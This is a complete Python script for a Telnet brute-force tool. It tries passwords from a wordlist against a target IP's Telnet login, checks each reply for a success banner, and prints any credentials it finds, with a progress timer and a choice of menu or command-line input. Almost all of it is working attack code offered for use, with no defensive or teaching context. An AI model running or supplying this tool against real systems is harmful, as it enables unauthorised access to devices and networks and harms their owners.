#!/usr/bin/env python3
# Telnet Brute Force (using telnetlib3)

import argparse
import asyncio
import telnetlib3
import sys
import time
import threading
import signal

RED = "\033[38;2;255;0;0m"
RESET = "\033[0m"
BOLD = "\033[1m"

DEFAULT_PORT = 23
SUCCESS_BANNER_TEMPLATE = "Login the CLI by {}"

stopTimer = False
progressLine = ""
timerThread = None
stdoutLock = threading.Lock()

def UpdateTimer(startTime):
    while not stopTimer:
        elapsed = time.time() - startTime
        elapsedFmt = time.strftime("%H:%M:%S", time.gmtime(elapsed))
        with stdoutLock:
            sys.stdout.write("\r\033[K" + progressLine + "\n")
            sys.stdout.write(f"Duration: {BOLD}{elapsedFmt}{RESET}")
            sys.stdout.write("\033[F")
            sys.stdout.flush()
        time.sleep(1)

async def TryPassword(host, port, username, password, successBanner):
    try:
        reader, writer = await telnetlib3.open_connection(
            host, port=port, shell=None, connect_minwait=0.1, connect_maxwait=1.0
        )
        await reader.readuntil("User:")
        writer.write(username + "\r\n")
        await reader.readuntil("Password:")
        writer.write(password + "\r\n")
        await asyncio.sleep(0.3)
        output = await reader.read(1024)
        writer.close()
        return successBanner in output
    except Exception:
        return False

async def TelnetBruteForce(host, port, username, passwords):
    global stopTimer, progressLine, timerThread

    successBanner = SUCCESS_BANNER_TEMPLATE.format(username)
    total = len(passwords)
    attempts = 0

    print(f"{RED}\n[*] Starting brute force: {username}@{host}:{port} ({total} passwords){RESET}")
    startTime = time.time()

    progressLine = f"Attempts: {BOLD}0/{total}{RESET} | Last: {BOLD}---{RESET}"
    stopTimer = False
    timerThread = threading.Thread(target=UpdateTimer, args=(startTime,))
    timerThread.start()

    for pwd in passwords:
        attempts += 1
        progressLine = f"Attempts: {BOLD}{attempts}/{total}{RESET} | Last: {BOLD}{pwd}{RESET}"
        with stdoutLock:
            sys.stdout.write("\r\033[K" + progressLine)
            sys.stdout.flush()

        if await TryPassword(host, port, username, pwd, successBanner):
            print(f"\n\n{RED}[+] SUCCESS:{RESET} \n{RED}Username: {RESET}{BOLD}{username}{RESET}\n{RED}Password: {RESET}{BOLD}{pwd}{RESET}")
            stopTimer = True
            timerThread.join()
            return

    stopTimer = True
    timerThread.join()
    print(f"\n\n{RED}[-] No valid password found.{RESET}")

def LoadPasswords(path):
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{RED}[!] Wordlist not found: {path}{RESET}")
        sys.exit(1)

def menu():
    host = input(f"\n{RED}Target IP: {RESET}").strip()
    username = input(f"{RED}Username: {RESET}").strip()
    wordlist = input(f"{RED}Wordlist [default: passwords.txt]: {RESET}").strip() or "passwords.txt"
    passwords = LoadPasswords(wordlist)
    asyncio.run(TelnetBruteForce(host, DEFAULT_PORT, username, passwords))

def terminal():
    parser = argparse.ArgumentParser(
        description="Telnet Brute Force Tool (using telnetlib3)",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-u", "--username", required=True, help="Username to brute")
    parser.add_argument("-w", "--wordlist", default="passwords.txt",
                        help="Path to wordlist (default: passwords.txt)")
    parser.add_argument("-p", "--port", type=int, default=DEFAULT_PORT,
                        help=f"Telnet port (default: {DEFAULT_PORT})")
    args = parser.parse_args()
    passwords = LoadPasswords(args.wordlist)
    asyncio.run(TelnetBruteForce(args.target, args.port, args.username, passwords))

def SignalHandler(sig, frame):
    global stopTimer, timerThread
    print(f"\n{RED}Stopping the attack...{RESET}")
    stopTimer = True
    if timerThread and timerThread.is_alive():
        timerThread.join()
    sys.exit(0)

def main():
    signal.signal(signal.SIGINT, SignalHandler)
    if len(sys.argv) > 1:
        terminal()
    else:
        menu()

if __name__ == "__main__":
    main()
